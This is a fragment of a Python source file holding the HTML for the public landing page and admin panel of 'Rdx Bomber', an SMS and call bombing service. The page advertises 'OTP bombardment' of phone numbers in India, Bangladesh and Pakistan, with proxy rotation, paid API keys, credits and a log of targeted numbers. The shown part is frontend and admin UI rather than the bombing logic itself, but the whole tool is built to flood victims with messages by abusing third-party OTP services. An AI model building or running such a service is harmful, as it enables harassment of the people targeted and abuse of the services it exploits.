.mode-tag.sms{background:rgba(139,92,246,.2);color:#a78bfa}
.mode-tag.call{background:rgba(6,182,212,.2);color:#22d3ee}
.mode-tag.custom{background:rgba(16,185,129,.2);color:#34d399}
.mode-tag.mixed{background:rgba(234,179,8,.2);color:#fbbf24}
.mode-tag.nuclear{background:rgba(244,63,94,.2);color:#fb7185}
.ep-code{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--dim);background:rgba(0,0,0,.3);border-radius:.4rem;padding:.55rem .75rem;overflow-x:auto;white-space:nowrap;border:1px solid var(--border)}

/* FEATURE GRID */
.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:.75rem;margin-bottom:3rem}
.feat{background:var(--surface);border:1px solid var(--border);border-radius:.85rem;padding:1.25rem;display:flex;gap:.85rem;align-items:flex-start}
.feat-icon{width:36px;height:36px;border-radius:.6rem;display:grid;place-items:center;font-size:1.1rem;flex-shrink:0}
.feat-icon.p{background:rgba(139,92,246,.18)}
.feat-icon.c{background:rgba(6,182,212,.18)}
.feat-icon.g{background:rgba(16,185,129,.18)}
.feat-icon.r{background:rgba(244,63,94,.18)}
.feat-icon.y{background:rgba(234,179,8,.18)}
.feat-icon.b{background:rgba(59,130,246,.18)}
.feat h4{font-size:.87rem;font-weight:700;margin-bottom:.2rem}
.feat p{font-size:.76rem;color:var(--muted);line-height:1.5}

/* FOOTER */
footer{text-align:center;padding-top:2rem;border-top:1px solid var(--border);color:var(--muted);font-size:.78rem}
footer a{color:var(--purple);text-decoration:none}
footer a:hover{color:var(--cyan)}
.powered{display:inline-flex;align-items:center;gap:.35rem;margin-top:.5rem;font-size:.7rem}
.dot{width:5px;height:5px;background:var(--green);border-radius:50%;animation:pulse 2s infinite}

@media(max-width:600px){
  .hero-title{font-size:2rem}
  .nav-links{display:none}
}
</style>
</head>
<body>
<div class="wrap">
  <nav>
    <div class="nav-logo">
      <div class="nav-logo-icon">💣</div>
      Rdx Bomber
    </div>
    <div class="nav-links">
      <a class="nav-link" href="/status">Status</a>
      <a class="nav-link" href="/health">Health</a>
      <a class="nav-link" href="/admin">Admin</a>
      <a class="nav-link active" href="https://t.me/{{ BOT_USERNAME }}">Bot</a>
    </div>
  </nav>

  <div class="hero">
    <div class="hero-badge"><span></span>Live · v3.0</div>
    <h1 class="hero-title">
      <span class="g">SMS Bombing</span><br>API Platform
    </h1>
    <p class="hero-sub">
      High-throughput OTP bombardment across India, Bangladesh &amp; Pakistan.
      {{ PROXY_MULTIPLIER }}× proxy rotation per request.
    </p>
    <div class="hero-cta">
      <a class="btn btn-primary" href="https://t.me/{{ BOT_USERNAME }}">🤖 Open Bot</a>
      <a class="btn btn-ghost" href="/admin">🛡️ Admin Panel</a>
      <a class="btn btn-ghost" href="/status">📊 Status JSON</a>
    </div>
  </div>

  <div class="stats">
    <div class="stat"><div class="stat-v" id="s-users">—</div><div class="stat-l">Users</div></div>
    <div class="stat"><div class="stat-v" id="s-bombs">—</div><div class="stat-l">Bombs Sent</div></div>
    <div class="stat"><div class="stat-v" id="s-ind">{{ INDIA_API_COUNT }}</div><div class="stat-l">India APIs</div></div>
    <div class="stat"><div class="stat-v" id="s-fb">{{ FIREBASE_COUNT }}</div><div class="stat-l">Firebase DBs</div></div>
    <div class="stat"><div class="stat-v" id="s-pak">{{ PAK_API_COUNT }}</div><div class="stat-l">PAK APIs</div></div>
    <div class="stat"><div class="stat-v">{{ PROXY_MULTIPLIER }}×</div><div class="stat-l">Multiplier</div></div>
  </div>

  <p class="section-title">API Endpoints</p>
  <div class="endpoints">
    <div class="ep-card">
      <div class="ep-header">
        <span class="ep-flag">🇮🇳</span>
        <div>
          <div class="ep-name">India</div>
          <div class="ep-modes">
            <span class="mode-tag sms">SMS</span>
            <span class="mode-tag custom">Custom</span>
            <span class="mode-tag nuclear">Nuclear</span>
          </div>
        </div>
      </div>
      <div class="ep-code">GET {{ BASE_URL }}/ind?key=KEY&amp;number=91XXXXXXXXXX&amp;mode=sms</div>
      <div class="ep-code">GET {{ BASE_URL }}/ind?key=KEY&amp;number=91XXXXXXXXXX&amp;mode=custom</div>
      <div class="ep-code">GET {{ BASE_URL }}/ind?key=KEY&amp;number=91XXXXXXXXXX&amp;mode=nuclear</div>
    </div>
    <div class="ep-card">
      <div class="ep-header">
        <span class="ep-flag">🇧🇩</span>
        <div>
          <div class="ep-name">Bangladesh</div>
          <div class="ep-modes">
            <span class="mode-tag sms">SMS</span>
            <span class="mode-tag call">Call</span>
            <span class="mode-tag mixed">Mixed</span>
            <span class="mode-tag nuclear">Nuclear</span>
          </div>
        </div>
      </div>
      <div class="ep-code">GET {{ BASE_URL }}/bd?key=KEY&amp;number=880XXXXXXXXX&amp;mode=sms</div>
      <div class="ep-code">GET {{ BASE_URL }}/bd?key=KEY&amp;number=880XXXXXXXXX&amp;mode=nuclear</div>
    </div>
    <div class="ep-card">
      <div class="ep-header">
        <span class="ep-flag">🇵🇰</span>
        <div>
          <div class="ep-name">Pakistan</div>
          <div class="ep-modes"><span class="mode-tag sms">SMS</span></div>
        </div>
      </div>
      <div class="ep-code">GET {{ BASE_URL }}/pak?key=KEY&amp;number=92XXXXXXXXXX</div>
    </div>
  </div>

  <p class="section-title">Platform Features</p>
  <div class="features">
    <div class="feat">
      <div class="feat-icon p">⚡</div>
      <div><h4>Proxy Rotation</h4><p>{{ PROXY_MULTIPLIER }}× multiplier — every API fired across a pool of proxies in parallel.</p></div>
    </div>
    <div class="feat">
      <div class="feat-icon c">🔑</div>
      <div><h4>API Keys</h4><p>Per-key daily limits, expiry dates, and instant revocation from the admin panel.</p></div>
    </div>
    <div class="feat">
      <div class="feat-icon g">🤖</div>
      <div><h4>Telegram Bot</h4><p>Full-featured bot with credits, referrals, force-join, gift codes and bomb flow.</p></div>
    </div>
    <div class="feat">
      <div class="feat-icon r">🔥</div>
      <div><h4>Firebase + SQLite</h4><p>Dual-write storage — Firebase for real-time sync, SQLite for offline fallback.</p></div>
    </div>
    <div class="feat">
      <div class="feat-icon y">📊</div>
      <div><h4>Bomb Log</h4><p>Every request logged with country, mode, number, success rate and timestamp.</p></div>
    </div>
    <div class="feat">
      <div class="feat-icon b">🛡️</div>
      <div><h4>Rate Limiting</h4><p>Per-IP rate limiting on all bomb endpoints to prevent abuse.</p></div>
    </div>
  </div>

  <footer>
    <p>Powered by <a href="{{ DEVELOPER_URL }}">{{ DEVELOPER }}</a></p>
    <p class="powered"><span class="dot"></span> All systems operational</p>
  </footer>
</div>

<script>
async function loadStats(){
  try{
    const d = await fetch('/status').then(r=>r.json());
    const counter = (el, to) => {
      const start = parseInt(el.textContent) || 0;
      const step = Math.ceil(Math.abs(to - start) / 30);
      let cur = start;
      const t = setInterval(() => {
        cur = cur + (to > cur ? step : -step);
        if ((to > start && cur >= to) || (to < start && cur <= to)) { el.textContent = to; clearInterval(t); return; }
        el.textContent = cur;
      }, 30);
    };
    counter(document.getElementById('s-users'), d.users||0);
    counter(document.getElementById('s-bombs'), d.bombs||0);
  } catch(e) {}
}
loadStats();
setInterval(loadStats, 15000);
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════════
#  ADMIN PAGE  — full redesign
# ═══════════════════════════════════════════════════════════════
ADMIN_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Rdx — Admin</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#06080f;--sidebar:#0c0f1a;--surface:rgba(255,255,255,.04);--surface2:rgba(255,255,255,.07);
  --border:rgba(255,255,255,.07);--border2:rgba(255,255,255,.13);
  --purple:#8b5cf6;--cyan:#06b6d4;--green:#10b981;--red:#f43f5e;--yellow:#f59e0b;--blue:#3b82f6;
  --text:#e2e8f0;--muted:#64748b;--dim:#94a3b8;
  --radius:.65rem;
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex}

/* SIDEBAR */
.sidebar{width:220px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;min-height:100vh;position:fixed;left:0;top:0;bottom:0;z-index:50;transition:transform .3s}
.sidebar-logo{padding:1.25rem 1.1rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:.6rem;font-weight:800;font-size:.95rem}
.sidebar-logo-icon{width:30px;height:30px;border-radius:.45rem;background:linear-gradient(135deg,var(--purple),var(--cyan));display:grid;place-items:center;font-size:.9rem;flex-shrink:0}
.sidebar-nav{flex:1;padding:.75rem .6rem;overflow-y:auto}
.nav-group-label{font-size:.6rem;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);padding:.5rem .6rem .25rem;font-weight:700}
.nav-item{display:flex;align-items:center;gap:.6rem;padding:.55rem .75rem;border-radius:.5rem;cursor:pointer;font-size:.82rem;color:var(--dim);transition:all .15s;margin-bottom:.15rem;border:none;background:none;width:100%;text-align:left}
.nav-item:hover{background:var(--surface2);color:var(--text)}
.nav-item.active{background:rgba(139,92,246,.15);color:var(--purple);font-weight:600}
.nav-item .icon{width:16px;text-align:center;flex-shrink:0}
.sidebar-footer{padding:.75rem .6rem;border-top:1px solid var(--border)}

/* MAIN */
.main{margin-left:220px;flex:1;min-height:100vh;display:flex;flex-direction:column}
.topbar{padding:1rem 1.5rem;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:rgba(6,8,15,.8);backdrop-filter:blur(10px);position:sticky;top:0;z-index:40}
.topbar-title{font-weight:800;font-size:1rem}
.topbar-right{display:flex;align-items:center;gap:.75rem}
.status-dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:pulse2 2s infinite}
@keyframes pulse2{0%,100%{box-shadow:0 0 0 0 rgba(16,185,129,.5)}50%{box-shadow:0 0 0 5px transparent}}
.content{flex:1;padding:1.5rem;overflow-y:auto}

/* LOGIN */
.login-wrap{flex:1;display:flex;align-items:center;justify-content:center;min-height:100vh;background:var(--bg)}
.login-card{background:rgba(255,255,255,.04);border:1px solid var(--border2);border-radius:1rem;padding:2.5rem;width:360px;max-width:95vw}
.login-card h2{margin-bottom:1.5rem;font-size:1.3rem;font-weight:800}
.login-card .logo-row{display:flex;align-items:center;gap:.7rem;margin-bottom:2rem}
.login-card .logo-icon{width:44px;height:44px;border-radius:.7rem;background:linear-gradient(135deg,var(--purple),var(--cyan));display:grid;place-items:center;font-size:1.4rem}

/* INPUTS */
input,select,textarea{font-family:'Inter',sans-serif;font-size:.85rem;color:var(--text);background:#0f1420;border:1px solid var(--border2);border-radius:.5rem;padding:.65rem .85rem;outline:none;transition:border-color .2s;width:100%}
input:focus,select:focus,textarea:focus{border-color:var(--purple)}
input::placeholder{color:var(--muted)}

/* BUTTONS */
.btn{display:inline-flex;align-items:center;gap:.4rem;padding:.6rem 1.2rem;border-radius:.5rem;font-weight:700;font-size:.82rem;border:none;cursor:pointer;transition:all .18s;text-decoration:none}
.btn-primary{background:linear-gradient(135deg,var(--purple),var(--cyan));color:#fff}
.btn-primary:hover{opacity:.88}
.btn-success{background:rgba(16,185,129,.2);color:var(--green);border:1px solid rgba(16,185,129,.3)}
.btn-success:hover{background:rgba(16,185,129,.3)}
.btn-danger{background:rgba(244,63,94,.15);color:var(--red);border:1px solid rgba(244,63,94,.25)}
.btn-danger:hover{background:rgba(244,63,94,.25)}
.btn-warning{background:rgba(245,158,11,.15);color:var(--yellow);border:1px solid rgba(245,158,11,.25)}
.btn-muted{background:var(--surface);color:var(--dim);border:1px solid var(--border)}
.btn-muted:hover{background:var(--surface2)}
.btn-full{width:100%;justify-content:center;padding:.7rem}

/* STAT CARDS */
.stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.75rem;margin-bottom:1.5rem}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1rem;position:relative;overflow:hidden}
.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
.stat-card.purple::before{background:linear-gradient(90deg,var(--purple),var(--cyan))}
.stat-card.green::before{background:var(--green)}
.stat-card.red::before{background:var(--red)}
.stat-card.yellow::before{background:var(--yellow)}
.stat-card.blue::before{background:var(--blue)}
.stat-v{font-size:1.5rem;font-weight:900;font-family:'JetBrains Mono',monospace;color:var(--text)}
.stat-l{font-size:.62rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-top:.2rem;font-weight:700}
.stat-sub{font-size:.7rem;color:var(--dim);margin-top:.15rem}

/* PANELS */
.panel{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-bottom:1.25rem}
.panel-head{padding:.85rem 1.1rem;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;gap:.75rem}
.panel-head h3{font-size:.88rem;font-weight:700}
.panel-body{padding:1.1rem}

/* TABLE */
.tbl-wrap{overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:.8rem}
th{padding:.6rem .85rem;text-align:left;color:var(--muted);font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;font-weight:700;border-bottom:1px solid var(--border)}
td{padding:.7rem .85rem;border-bottom:1px solid rgba(255,255,255,.04);vertical-align:middle}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(255,255,255,.025)}

/* BADGES */
.badge{display:inline-flex;align-items:center;gap:.25rem;padding:.2rem .5rem;border-radius:.3rem;font-size:.68rem;font-weight:700;letter-spacing:.03em}
.badge-green{background:rgba(16,185,129,.15);color:var(--green)}
.badge-red{background:rgba(244,63,94,.15);color:var(--red)}
.badge-blue{background:rgba(59,130,246,.15);color:var(--blue)}
.badge-yellow{background:rgba(245,158,11,.15);color:var(--yellow)}
.badge-purple{background:rgba(139,92,246,.15);color:#a78bfa}

/* FORM ROWS */
.form-row{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:.75rem}
.form-row input{flex:1;min-width:120px;margin:0}
.form-row .btn{flex-shrink:0}

/* TOAST */
.toast{position:fixed;bottom:1.5rem;right:1.5rem;z-index:999;display:flex;flex-direction:column;gap:.5rem}
.toast-item{background:#1e2235;border:1px solid var(--border2);border-radius:.6rem;padding:.7rem 1rem;font-size:.82rem;animation:slide-in .2s ease;display:flex;align-items:center;gap:.5rem;min-width:220px;box-shadow:0 8px 32px rgba(0,0,0,.4)}
@keyframes slide-in{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.toast-item.ok{border-left:3px solid var(--green)}
.toast-item.err{border-left:3px solid var(--red)}
.toast-item.info{border-left:3px solid var(--purple)}

/* VIEWS */
.view{display:none}.view.active{display:block}

/* GRID 2 */
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
@media(max-width:700px){.grid2{grid-template-columns:1fr};.sidebar{transform:translateX(-100%)};.main{margin-left:0}}

/* misc */
code{font-family:'JetBrains Mono',monospace;font-size:.78rem;background:rgba(0,0,0,.3);padding:.1rem .4rem;border-radius:.3rem;color:var(--cyan)}
.mono{font-family:'JetBrains Mono',monospace;font-size:.75rem}
.flex-row{display:flex;gap:.5rem;align-items:center;flex-wrap:wrap}
.spacer{flex:1}
hr{border:none;border-top:1px solid var(--border);margin:1rem 0}
.empty{color:var(--muted);font-size:.82rem;text-align:center;padding:2rem}
#key-result{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--cyan);padding:.6rem;background:rgba(0,0,0,.3);border-radius:.4rem;margin:.5rem 0;display:none;word-break:break-all}
#gift-result,#import-result{font-size:.8rem;padding:.6rem;border-radius:.4rem;margin:.5rem 0;display:none}
#gift-result{color:var(--cyan);background:rgba(0,0,0,.3);font-family:'JetBrains Mono',monospace;word-break:break-all}
#import-result.ok{background:rgba(16,185,129,.1);color:var(--green)}
#import-result.err{background:rgba(244,63,94,.1);color:var(--red)}
.toggle-wrap{display:flex;align-items:center;gap:.6rem;padding:.5rem 0}
.toggle{position:relative;width:40px;height:22px;cursor:pointer}
.toggle input{opacity:0;width:0;height:0;position:absolute}
.toggle-track{position:absolute;inset:0;background:#1e2235;border:1px solid var(--border2);border-radius:11px;transition:background .2s}
.toggle input:checked+.toggle-track{background:var(--purple);border-color:var(--purple)}
.toggle-thumb{position:absolute;top:3px;left:3px;width:14px;height:14px;background:#fff;border-radius:50%;transition:left .2s;pointer-events:none}
.toggle input:checked~.toggle-thumb{left:21px}
</style>
</head>
<body>

<!-- LOGIN -->
<div id="login-screen" class="login-wrap" style="width:100%;position:fixed;inset:0;z-index:999;display:flex">
  <div class="login-card">
    <div class="logo-row">
      <div class="logo-icon">💣</div>
      <div>
        <div style="font-weight:900;font-size:1.1rem">Rdx Bomber</div>
        <div style="font-size:.72rem;color:var(--muted)">Admin Control Panel v3.0</div>
      </div>
    </div>
    <input id="pw" type="password" placeholder="Enter admin password" autocomplete="current-password" style="margin-bottom:.75rem">
    <div id="login-err" style="color:var(--red);font-size:.8rem;margin-bottom:.6rem;display:none">❌ Wrong password</div>
    <button class="btn btn-primary btn-full" onclick="doLogin()">Unlock Panel →</button>
  </div>
</div>

<!-- APP -->
<aside class="sidebar" id="sidebar">
  <div class="sidebar-logo">
    <div class="sidebar-logo-icon">💣</div>
    Rdx Admin
  </div>
  <nav class="sidebar-nav">
    <div class="nav-group-label">Overview</div>
    <button class="nav-item active" onclick="showView('dashboard')"><span class="icon">📊</span>Dashboard</button>
    <button class="nav-item" onclick="showView('bomb-log')"><span class="icon">💥</span>Bomb Log</button>
    <div class="nav-group-label" style="margin-top:.5rem">Manage</div>
    <button class="nav-item" onclick="showView('users')"><span class="icon">👥</span>Users</button>
    <button class="nav-item" onclick="showView('keys')"><span class="icon">🔑</span>API Keys</button>
    <button class="nav-item" onclick="showView('channels')"><span class="icon">📢</span>Channels</button>
    <button class="nav-item" onclick="showView('gifts')"><span class="icon">🎟️</span>Gift Codes</button>
    <div class="nav-group-label" style="margin-top:.5rem">System</div>
    <button class="nav-item" onclick="showView('settings')"><span class="icon">⚙️</span>Settings</button>
    <button class="nav-item" onclick="showView('proxies')"><span class="icon">🔀</span>Proxies</button>
    <button class="nav-item" onclick="showView('data')"><span class="icon">💾</span>Data</button>
  </nav>
  <div class="sidebar-footer">
    <button class="nav-item" onclick="window.open('/', '_blank')"><span class="icon">🌐</span>View Site</button>
  </div>
</aside>

<div class="main" id="main">
  <div class="topbar">
    <div class="topbar-title" id="page-title">Dashboard</div>
    <div class="topbar-right">
      <div class="status-dot" id="status-dot" title="Online"></div>
      <span style="font-size:.78rem;color:var(--dim)" id="status-txt">Online</span>
      <button class="btn btn-muted" onclick="refreshAll()">↻ Refresh</button>
    </div>
  </div>
  <div class="content">

    <!-- DASHBOARD -->
    <div id="v-dashboard" class="view active">
      <div class="stat-grid" id="stat-grid">
        <div class="stat-card purple"><div class="stat-v" id="st-users">—</div><div class="stat-l">Total Users</div><div class="stat-sub" id="st-new24">— new today</div></div>
        <div class="stat-card green"><div class="stat-v" id="st-bombs">—</div><div class="stat-l">Bombs Sent</div></div>
        <div class="stat-card blue"><div class="stat-v" id="st-keys">—</div><div class="stat-l">Active Keys</div></div>
        <div class="stat-card yellow"><div class="stat-v" id="st-credits">—</div><div class="stat-l">Total Credits</div></div>
        <div class="stat-card purple"><div class="stat-v" id="st-premium">—</div><div class="stat-l">Premium Users</div></div>
        <div class="stat-card red"><div class="stat-v" id="st-banned">—</div><div class="stat-l">Banned</div></div>
        <div class="stat-card green"><div class="stat-v" id="st-chans">—</div><div class="stat-l">Channels</div></div>
        <div class="stat-card blue"><div class="stat-v" id="st-proxies">—</div><div class="stat-l">Proxies</div></div>
      </div>
      <div class="grid2">
        <div class="panel">
          <div class="panel-head"><h3>🛠 System Info</h3></div>
          <div class="panel-body" id="sys-info" style="font-size:.82rem;line-height:2;color:var(--dim)">Loading…</div>
        </div>
        <div class="panel">
          <div class="panel-head"><h3>⚡ API Coverage</h3></div>
          <div class="panel-body">
            <div style="margin-bottom:.75rem">
              <div style="display:flex;justify-content:space-between;font-size:.8rem;margin-bottom:.3rem">
                <span>🇮🇳 India SMS APIs</span><span id="cv-ind" class="mono" style="color:var(--cyan)">—</span>
              </div>
              <div style="height:4px;background:var(--border2);border-radius:2px"><div id="bar-ind" style="height:4px;background:linear-gradient(90deg,var(--purple),var(--cyan));border-radius:2px;width:0%;transition:width 1s"></div></div>
            </div>
            <div style="margin-bottom:.75rem">
              <div style="display:flex;justify-content:space-between;font-size:.8rem;margin-bottom:.3rem">
                <span>🔥 Firebase DBs</span><span id="cv-fb" class="mono" style="color:var(--cyan)">—</span>
              </div>
              <div style="height:4px;background:var(--border2);border-radius:2px"><div id="bar-fb" style="height:4px;background:linear-gradient(90deg,var(--red),var(--yellow));border-radius:2px;width:0%;transition:width 1s"></div></div>
            </div>
            <div>
              <div style="display:flex;justify-content:space-between;font-size:.8rem;margin-bottom:.3rem">
                <span>🇵🇰 Pakistan APIs</span><span id="cv-pak" class="mono" style="color:var(--cyan)">—</span>
              </div>
              <div style="height:4px;background:var(--border2);border-radius:2px"><div id="bar-pak" style="height:4px;background:linear-gradient(90deg,var(--green),var(--cyan));border-radius:2px;width:0%;transition:width 1s"></div></div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- BOMB LOG -->
    <div id="v-bomb-log" class="view">
      <div class="panel">
        <div class="panel-head">
          <h3>💥 Recent Bomb Activity</h3>
          <button class="btn btn-muted" onclick="loadBombLog()">↻ Refresh</button>
        </div>
        <div class="tbl-wrap">
          <table>
            <thead><tr><th>#</th><th>Country</th><th>Mode</th><th>Number</th><th>Sent/Total</th><th>Time</th></tr></thead>
            <tbody id="bomb-log-body"><tr><td colspan="6" class="empty">Loading…</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- USERS -->
    <div id="v-users" class="view">
      <div class="panel" style="margin-bottom:1rem">
        <div class="panel-body">
          <div class="form-row">
            <input type="text" id="uid-search" placeholder="Search by Telegram ID…" style="max-width:220px">
            <button class="btn btn-muted" onclick="findUser()">🔍 Find</button>
            <button class="btn btn-success" onclick="loadUsers()">Load All Users</button>
          </div>
          <div id="user-detail" style="display:none;margin-top:.75rem;padding:.85rem;background:rgba(0,0,0,.3);border-radius:.5rem;font-size:.82rem"></div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-head"><h3>👥 User List</h3><span id="user-count" style="font-size:.75rem;color:var(--muted)"></span></div>
        <div class="tbl-wrap">
          <table>
            <thead><tr><th>ID</th><th>Name</th><th>Credits</th><th>Bombs</th><th>Premium</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody id="users-body"><tr><td colspan="7" class="empty">Click "Load All Users"</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- KEYS -->
    <div id="v-keys" class="view">
      <div class="panel" style="margin-bottom:1rem">
        <div class="panel-head"><h3>➕ Generate New Key</h3></div>
        <div class="panel-body">
          <div class="form-row">
            <input type="text" id="key-uid" placeholder="User Telegram ID" style="max-width:200px">
            <input type="number" id="key-days" placeholder="Days (e.g. 30)" style="max-width:140px" value="30">
            <button class="btn btn-success" onclick="genKey()">Generate Key</button>
          </div>
          <div id="key-result"></div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-head"><h3>🔑 Active Keys</h3><button class="btn btn-muted" onclick="loadKeys()">↻ Refresh</button></div>
        <div class="tbl-wrap">
          <table>
            <thead><tr><th>Key</th><th>User ID</th><th>Plan</th><th>Expires</th><th>Status</th><th>Action</th></tr></thead>
            <tbody id="keys-body"><tr><td colspan="6" class="empty">Loading…</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- CHANNELS -->
    <div id="v-channels" class="view">
      <div class="panel" style="margin-bottom:1rem">
        <div class="panel-head"><h3>➕ Add Force-Join Channel</h3></div>
        <div class="panel-body">
          <div class="form-row">
            <input type="text" id="ch-id" placeholder="Chat ID or @username">
            <input type="text" id="ch-title" placeholder="Display Title">
            <input type="text" id="ch-link" placeholder="https://t.me/…">
            <button class="btn btn-success" onclick="addChannel()">Add Channel</button>
          </div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-head"><h3>📢 Channels</h3></div>
        <div class="tbl-wrap">
          <table>
            <thead><tr><th>Chat ID</th><th>Title</th><th>Link</th><th>Action</th></tr></thead>
            <tbody id="ch-body"><tr><td colspan="4" class="empty">Loading…</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- GIFTS -->
    <div id="v-gifts" class="view">
      <div class="panel" style="margin-bottom:1rem">
        <div class="panel-head"><h3>➕ Create Gift Code</h3></div>
        <div class="panel-body">
          <div class="form-row">
            <input type="number" id="g-credits" placeholder="Credits" style="max-width:120px">
            <input type="number" id="g-users" placeholder="Max users (0=∞)" style="max-width:160px">
            <input type="number" id="g-days" placeholder="Valid days" style="max-width:120px" value="7">
          </div>
          <div class="flex-row" style="margin-top:.4rem">
            <label class="toggle"><input type="checkbox" id="g-prem"><div class="toggle-track"></div><div class="toggle-thumb"></div></label>
            <span style="font-size:.82rem">Include Premium Access</span>
            <div class="spacer"></div>
            <button class="btn btn-success" onclick="createGift()">Create Gift Code</button>
          </div>
          <div id="gift-result"></div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-head"><h3>🎟️ Gift Codes</h3><button class="btn btn-muted" onclick="loadGifts()">↻ Refresh</button></div>
        <div class="tbl-wrap">
          <table>
            <thead><tr><th>Code</th><th>Credits</th><th>Claimed</th><th>Premium</th><th>Expires</th><th>Action</th></tr></thead>
            <tbody id="gift-body"><tr><td colspan="6" class="empty">Loading…</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- SETTINGS -->
    <div id="v-settings" class="view">
      <div class="grid2">
        <div class="panel">
          <div class="panel-head"><h3>⚙️ Bot Settings</h3></div>
          <div class="panel-body">
            <label style="font-size:.8rem;color:var(--muted);display:block;margin-bottom:.3rem">Daily API Limit per Key</label>
            <div class="form-row" style="margin-bottom:1rem">
              <input type="number" id="set-limit" placeholder="e.g. 500" style="max-width:160px">
              <button class="btn btn-success" onclick="saveLimit()">Save</button>
            </div>
            <div class="toggle-wrap">
              <label class="toggle"><input type="checkbox" id="tog-maintenance" onchange="toggleMaintenance()"><div class="toggle-track"></div><div class="toggle-thumb"></div></label>
              <div>
                <div style="font-size:.85rem;font-weight:600">Maintenance Mode</div>
                <div style="font-size:.72rem;color:var(--muted)">All bomb endpoints return 503</div>
              </div>
            </div>
          </div>
        </div>
        <div class="panel">
          <div class="panel-head"><h3>📋 Current Config</h3></div>
          <div class="panel-body" id="settings-info" style="font-size:.8rem;line-height:2;color:var(--dim)">Loading…</div>
        </div>
      </div>
    </div>

    <!-- PROXIES -->
    <div id="v-proxies" class="view">
      <div class="panel">
        <div class="panel-head"><h3>🔀 Proxy Pool Info</h3><button class="btn btn-muted" onclick="loadProxies()">↻ Refresh</button></div>
        <div class="panel-body" id="proxy-info" style="font-size:.85rem;line-height:2">Loading…</div>
      </div>
    </div>

    <!-- DATA -->
    <div id="v-data" class="view">
      <div class="grid2">
        <div class="panel">
          <div class="panel-head"><h3>📥 Import Database</h3></div>
          <div class="panel-body">
            <textarea id="import-json" rows="8" placeholder='Paste JSON: {"users":[...]}'></textarea>
            <div class="flex-row" style="margin-top:.6rem">
              <button class="btn btn-success" onclick="doImport()">Import</button>
              <div id="import-result"></div>
            </div>
          </div>
        </div>
        <div class="panel">
          <div class="panel-head"><h3>📤 Export Database</h3></div>
          <div class="panel-body">
            <p style="font-size:.82rem;color:var(--dim);margin-bottom:1rem">Export all users, keys, gift codes and channels as a single JSON file.</p>
            <button class="btn btn-primary" onclick="doExport()">⬇ Export All Data</button>
          </div>
        </div>
      </div>
    </div>

  </div><!-- /content -->
</div><!-- /main -->

<div class="toast" id="toast"></div>

<script>
let TOKEN = '';
const $ = id => document.getElementById(id);
const E = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const fmtDate = ts => ts ? new Date(ts*1000).toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'2-digit'}) : '—';
const fmtTime = ts => ts ? new Date(ts*1000).toLocaleString() : '—';

function toast(msg, type='info'){
  const wrap = $('toast');
  const el = document.createElement('div');
  el.className = `toast-item ${type}`;
  const icon = type==='ok'?'✅':type==='err'?'❌':'💬';
  el.innerHTML = `${icon} ${E(msg)}`;
  wrap.appendChild(el);
  setTimeout(()=>el.remove(), 3200);
}

async function api(path, method='GET', body=null){
  const opts = {method, headers:{'Content-Type':'application/json','X-Admin-Token':TOKEN}};
  if(body) opts.body = JSON.stringify(body);
  const r = await fetch('/admin/api' + path, opts);
  return r.json();
}

async function doLogin(){
  const pw = $('pw').value;
  const d = await api('/login','POST',{password:pw});
  if(d.token){
    TOKEN = d.token;
    $('login-screen').style.display = 'none';
    document.getElementById('main').style.display = 'flex';
    init();
  } else {
    $('login-err').style.display = 'block';
  }
}
$('pw').addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });

function showView(name){
  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(b=>b.classList.remove('active'));
  $('v-'+name).classList.add('active');
  event.currentTarget.classList.add('active');
  const labels = {dashboard:'Dashboard','bomb-log':'Bomb Log',users:'Users',keys:'API Keys',channels:'Channels',gifts:'Gift Codes',settings:'Settings',proxies:'Proxies',data:'Data'};
  $('page-title').textContent = labels[name] || name;
  if(name==='users') loadUsers();
  else if(name==='keys') loadKeys();
  else if(name==='channels') loadChannels();
  else if(name==='gifts') loadGifts();
  else if(name==='settings') loadSettings();
  else if(name==='proxies') loadProxies();
  else if(name==='bomb-log') loadBombLog();
}

